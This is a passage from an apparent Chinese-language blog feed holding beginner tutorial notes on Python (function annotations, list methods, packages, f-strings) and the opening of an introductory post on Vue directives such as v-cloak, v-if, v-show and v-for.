str:</span></span><br><span class="line">    print(<span class="string">"Annotations:"</span>, label.__annotations__)</span><br><span class="line">    print(<span class="string">"Arguments:"</span>, ham, eggs)</span><br><span class="line">    <span class="keyword">return</span> ham + <span class="string">' and '</span> + eggs</span><br><span class="line"></span><br><span class="line">label(<span class="string">'spam'</span>)</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python label.py</span><br><span class="line">Annotations: &#123;<span class="string">'ham'</span>: &lt;class <span class="string">'str'</span>&gt;, <span class="string">'eggs'</span>: &lt;class <span class="string">'str'</span>&gt;, <span class="string">'return'</span>: &lt;class <span class="string">'str'</span>&gt;&#125;</span><br><span class="line">Arguments: spam eggs</span><br></pre></td></tr></table></figure></div><p><strong>标注函数一字典的形式存放在函数的__annotations__属性中,并不会影响函数的任何其他部分。</strong></p><p><strong>形参标注的定义方式是在形参名称后面加冒号，后面跟个表达式，该表达式会被请求为标注的值。返回值标注的定义形式是加上一个组合符号-&gt;，后面跟一个表达式，该标注位于形参列表和表示def语句结束的冒号之间。</strong></p><h3 id="列表的更多特性"><a href="#列表的更多特性" class="headerlink" title="列表的更多特性"></a>列表的更多特性</h3><ul><li><p><strong>list.append(x)</strong></p><p><strong>在列表的末尾添加一个元素。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(<span class="number">3</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure></div></li><li><p><strong>list.extend(iterable)</strong></p><p><strong>使用可迭代对象中的所有元素来扩展列表。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList = [<span class="number">123</span>, <span class="string">'xyz'</span>, <span class="string">'zara'</span>, <span class="string">'abc'</span>, <span class="number">123</span>];</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bList = [<span class="number">2009</span>, <span class="string">'manni'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList.extend(bList)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(aList)</span><br><span class="line">[<span class="number">123</span>, <span class="string">'xyz'</span>, <span class="string">'zara'</span>, <span class="string">'abc'</span>, <span class="number">123</span>, <span class="number">2009</span>, <span class="string">'manni'</span>]</span><br></pre></td></tr></table></figure></div></li><li><p><strong>list.insert(i,x)</strong></p><p><strong>在给定的位置插入一个元素。第一个参数是要插入的元素的索引。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList.insert(<span class="number">0</span>,<span class="string">"first"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList</span><br><span class="line">[<span class="string">'first'</span>, <span class="number">123</span>, <span class="string">'xyz'</span>, <span class="string">'zara'</span>, <span class="string">'abc'</span>, <span class="number">123</span>, <span class="number">2009</span>, <span class="string">'manni'</span>]</span><br></pre></td></tr></table></figure></div></li></ul><ul><li><p><strong>lsit.remove(x)</strong></p><p><strong>移除列表第一个值为x的元素。如果没有这样的元素，则抛出ValueError异常。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList.remove(<span class="string">"x"</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;pyshell#78&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    aList.remove(<span class="string">"x"</span>)</span><br><span class="line">ValueError: list.remove(x): x <span class="keyword">not</span> <span class="keyword">in</span> list</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList.remove(<span class="number">123</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList</span><br><span class="line">[<span class="string">'first'</span>, <span class="string">'xyz'</span>, <span class="string">'zara'</span>, <span class="string">'abc'</span>, <span class="number">123</span>, <span class="number">2009</span>, <span class="string">'manni'</span>]</span><br></pre></td></tr></table></figure></div></li></ul><ul><li><p><strong>list.pop([i])</strong></p><p><strong>删除列表中给定位置的元素并返回它。如果没有给定位置，pop()将会删除并返回列表中的最后一个元素。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList</span><br><span class="line">[<span class="string">'first'</span>, <span class="string">'xyz'</span>, <span class="string">'zara'</span>, <span class="string">'abc'</span>, <span class="number">123</span>, <span class="number">2009</span>, <span class="string">'manni'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList.pop(<span class="number">1</span>)</span><br><span class="line"><span class="string">'xyz'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList.pop()</span><br><span class="line"><span class="string">'manni'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList</span><br><span class="line">[<span class="string">'first'</span>, <span class="string">'zara'</span>, <span class="string">'abc'</span>, <span class="number">123</span>, <span class="number">2009</span>]</span><br></pre></td></tr></table></figure></div></li></ul><ul><li><p><strong>list.clear()</strong></p><p><strong>删除列表中所有的元素。</strong></p></li></ul><ul><li><p><strong>list.index(start,end)</strong></p><p><strong>返回列表中第一个值为x的元素的从零开始索引。如果没有这样的元素将会抛出异常。</strong></p><p><strong>可选参数start和end是切片符合，用于将搜索限制为列表的特定子序列。返回的所有是相对于整个序列的开始计算的，而不是start参数。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList</span><br><span class="line">[<span class="string">'first'</span>, <span class="string">'zara'</span>, <span class="string">'abc'</span>, <span class="number">123</span>, <span class="number">2009</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>aList.index(<span class="string">'first'</span>)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div></li></ul><ul><li><p><strong>list.count(x)</strong></p><p><strong>返回元素x在列表中出现的次数</strong></p></li></ul><ul><li><p><strong>list.sort(key=None,reverse=False)</strong></p><p><strong>对列表中的元素进行排序</strong></p></li></ul><ul><li><p><strong>list.reverse()</strong></p><p><strong>反转列表中的元素</strong></p></li></ul><ul><li><p><strong>list.copy()</strong></p><p><strong>返回列表的一个浅拷贝。</strong></p></li></ul><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sound/                          Top-level package</span><br><span class="line">      __init__.py               Initialize the sound package</span><br><span class="line">      formats/                  Subpackage <span class="keyword">for</span> file format conversions</span><br><span class="line">              __init__.py</span><br><span class="line">              wavread.py</span><br><span class="line">              wavwrite.py</span><br><span class="line">              aiffread.py</span><br><span class="line">              aiffwrite.py</span><br><span class="line">              auread.py</span><br><span class="line">              auwrite.py</span><br><span class="line">              ...</span><br><span class="line">      effects/                  Subpackage <span class="keyword">for</span> sound effects</span><br><span class="line">              __init__.py</span><br><span class="line">              echo.py</span><br><span class="line">              surround.py</span><br><span class="line">              reverse.py</span><br><span class="line">              ...</span><br><span class="line">      filters/                  Subpackage <span class="keyword">for</span> filters</span><br><span class="line">              __init__.py</span><br><span class="line">              equalizer.py</span><br><span class="line">              vocoder.py</span><br><span class="line">              karaoke.py</span><br></pre></td></tr></table></figure></div><p><strong>你会发现上面的目录下都有一个一样的文件，_<em>init_</em>.py</strong></p><p><strong>因为必须要有这个文件才能让python将包含该文件的目录当做包。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sound.effects.echo</span><br></pre></td></tr></table></figure></div><p><strong>我们必须要把全名导入，不然无法使用这个包。这样会不会觉得很麻烦，每次都要一个一个的导入，多了就很费时间。</strong></p><p>当我们想要导入effect目录下所有的包怎么办？</p><p>我们将effect目录下的_<em>init_</em>.py文件进行修改</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__all__ = [<span class="string">"echo"</span>,<span class="string">"surround"</span>,<span class="string">"reverse"</span>]</span><br></pre></td></tr></table></figure></div><p>当我们需要导入包时只需要：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sound.effects <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure></div><h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><h4 id="格式化字符串文字"><a href="#格式化字符串文字" class="headerlink" title="格式化字符串文字"></a>格式化字符串文字</h4><blockquote><p><a href="https://docs.python.org/zh-cn/3/reference/lexical_analysis.html#f-strings" target="_blank" rel="noopener">格式化字符串字面值</a> （常简称为 f-字符串）能让你在字符串前加上 <code>f</code> 和 <code>F</code> 并将表达式写成 <code>{expression}</code> 来在字符串中包含 Python 表达式的值。</p></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(<span class="string">f'The value of pi is approximately <span class="subst">&#123;math.pi:<span class="number">.3</span>f&#125;</span>.'</span>)</span><br><span class="line">The value of pi <span class="keyword">is</span> approximately <span class="number">3.142</span>.</span><br></pre></td></tr></table></figure></div><p><strong>在‘：’后传递一个整数可以让该字段成为最小字符宽度。</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>table = &#123;<span class="string">'Sjoerd'</span>: <span class="number">4127</span>, <span class="string">'Jack'</span>: <span class="number">4098</span>, <span class="string">'Dcab'</span>: <span class="number">7678</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> name,phone <span class="keyword">in</span> table.items():</span><br><span class="line">print(<span class="string">f'<span class="subst">&#123;name:<span class="number">10</span>&#125;</span> ==&gt; <span class="subst">&#123;phone:<span class="number">10</span>&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Sjoerd     ==&gt;       4127</span><br><span class="line">Jack       ==&gt;       4098</span><br><span class="line">Dcab       ==&gt;       7678</span><br></pre></td></tr></table></figure><p><strong>其他的修饰符可用于在格式转化之前转化值。’!a’应用ascii(),’!s’应用str(),还有’!r’应用repr()</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue初识</title>
      <link href="/2019/06/17/vue-chu-shi/"/>
      <url>/2019/06/17/vue-chu-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue初识"><a href="#Vue初识" class="headerlink" title="Vue初识"></a>Vue初识</h1><h2 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h2><h3 id="v-cloak"><a href="#v-cloak" class="headerlink" title="v-cloak"></a>v-cloak</h3><blockquote><h4 id="在Vue实例结束编译时从绑定的HTML元素上移除，经常和CSS的display-none-配合使用。"><a href="#在Vue实例结束编译时从绑定的HTML元素上移除，经常和CSS的display-none-配合使用。" class="headerlink" title="在Vue实例结束编译时从绑定的HTML元素上移除，经常和CSS的display:none 配合使用。"></a>在Vue实例结束编译时从绑定的HTML元素上移除，经常和CSS的display:none 配合使用。</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id = &apos;app&apos; v-cloak&gt;</span><br><span class="line">    &#123;&#123;message&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            message: &quot;this is message&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p><strong>当我们加载程序的时候，如果遇见网上较慢情况，我们将会看到，所以我们需要结合CSS来让它不显示。</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[v-cloak] &#123;</span><br><span class="line">dispaly: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="v-once"><a href="#v-once" class="headerlink" title="v-once"></a>v-once</h3><blockquote><h4 id="定义它的元素或组件只能渲染一次，包括元素或所有组件的字节点。渲染后将不再渲染，视为静态文件。"><a href="#定义它的元素或组件只能渲染一次，包括元素或所有组件的字节点。渲染后将不再渲染，视为静态文件。" class="headerlink" title="定义它的元素或组件只能渲染一次，包括元素或所有组件的字节点。渲染后将不再渲染，视为静态文件。"></a>定义它的元素或组件只能渲染一次，包括元素或所有组件的字节点。渲染后将不再渲染，视为静态文件。</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;span v-once&gt;&#123;&#123;message&#125;&#125;&lt;/span&gt;</span><br><span class="line">        &lt;div v-once&gt;</span><br><span class="line">            &lt;span&gt; &#123;&#123; message &#125;&#125; &lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        var app = new Vue(&#123;</span><br><span class="line">            el: &apos;#app&apos;,</span><br><span class="line">            data: &#123;</span><br><span class="line">                message: &quot;this is message&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h3 id="v-if-v-else-if-v-else"><a href="#v-if-v-else-if-v-else" class="headerlink" title="v-if,v-else-if,v-else"></a>v-if,v-else-if,v-else</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;template v-if=&quot;type === &apos;name&apos;&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;&quot;&gt;用户名：&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; key=&quot;name-input&quot;&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">        &lt;template v-else&gt;</span><br><span class="line">            &lt;label for=&quot;&quot;&gt;邮箱名：&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; key=&quot;mail-input&quot;&gt;</span><br><span class="line">        &lt;/template&gt;</span><br><span class="line">        &lt;button @click=&quot;buttonclick&quot;&gt;切换类型&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            type: &apos;name&apos;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods: &#123;</span><br><span class="line">            buttonclick: function () &#123;</span><br><span class="line">                this.type = this.type === &apos;name&apos; ? &apos;mail&apos; : &apos;name&apos; ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h3 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h3><blockquote><h4 id="v-show就是改变CSS的display"><a href="#v-show就是改变CSS的display" class="headerlink" title="v-show就是改变CSS的display"></a>v-show就是改变CSS的display</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;h1 v-show=&quot;show&quot;&gt;</span><br><span class="line">            this is titile</span><br><span class="line">        &lt;/h1&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new  Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            show: false</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><blockquote><h4 id="顾名思义就是当我们获得到一个List或者数组进行for循环获得具体内容"><a href="#顾名思义就是当我们获得到一个List或者数组进行for循环获得具体内容" class="headerlink" title="顾名思义就是当我们获得到一个List或者数组进行for循环获得具体内容"></a>顾名思义就是当我们获得到一个List或者数组进行for循环获得具体内容</h4></blockquote><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;app&quot;&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li v-for=&quot;(book,index) in books&quot;&gt;&#123;&#123;index&#125;&#125; - &#123;&#123;book.name&#125;&#125;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;template v-for=&quot;book in books&quot;&gt;</span><br><span class="line">                &lt;li&gt;书名：&#123;&#123;book.name&#125;&#125;&lt;/li&gt;</span><br><span class="line">                &lt;li&gt;作者:&#123;&#123;book.author&#125;&#125;&lt;/li&gt;</span><br><span class="line">            &lt;/template&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">        &lt;span v-for=&quot;u in user&quot;&gt;</span><br><span class="line">            &#123;&#123;u&#125;&#125;</span><br><span class="line">        &lt;/span&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    var app = new Vue(&#123;</span><br><span class="line">        el: &apos;#app&apos;,</span><br><span class="line">        data: &#123;</span><br><span class="line">            books: [</span><br><span class="line">                &#123;</span><br><span class="line">                    name: &apos;《Vue 实战》&apos;,</span><br><span class="line">                    author: &apos;kalifun&apos;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    name: &apos;《Linux 就该这么学》&apos;,</span><br><span class="line">                    author: &apos;kali&apos;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            user: &#123;</span><br><span class="line">                name: &apos;kali&apos;,</span><br><span class="line">                age: 23,</span><br><span class="line">                language: &apos;python&apos;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure></div><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>0 - 《Vue 实战》<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>1 - 《Linux 就该这么学》<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>书名：《Vue 实战》<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>作者:kalifun<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>书名：《Linux 就该这么学》<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>作者:kali<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"></span><br><span class="line">kali 23 python</span><br></pre></td></tr></table></figure></div><h4 id="数组更新"><a href="#数组更新" class="headerlink" title="数组更新"></a>数组更新</h4><h5 id="变异方法"><a href="#变异方法" class="headerlink" title="变异方法"></a>变异方法</h5><p><strong>Vue的核心是数据和视图双向绑定的，当我们更新了数据，视图也会自动更新。</strong></p><ul><li><p><strong>push</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.books.push(&#123;name:'《CSS》',author:'kali'&#125;);</span><br></pre></td></tr></table></figure></div></li><li><p><strong>pop()</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.books.pop();</span><br><span class="line">//删除最后一组元素</span><br></pre></td></tr></table></figure></div></li><li><p><strong>shift()</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.books.shift();</span><br><span class="line">//把数组的第一个元素从其中删除</span><br></pre></td></tr></table></figure></div></li><li><p><strong>unshift()</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.books.unshift(&#123;name:&apos;《CSS》&apos;,author:&apos;kali&apos;&#125;);</span><br><span class="line">//在数组的开始添加新的元素</span><br></pre></td></tr></table></figure></div></li><li><p><strong>splice()</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从数组中添加/删除项目，然后返回被删除的项目。</span><br></pre></td></tr></table></figure></div></li><li><p><strong>sort()</strong> </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.books.sort();</span><br><span class="line">//返回数组排序后的结果</span><br></pre></td></tr></table></figure></div></li><li><p><strong>reverse()</strong></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.books.reverse();</span><br><span 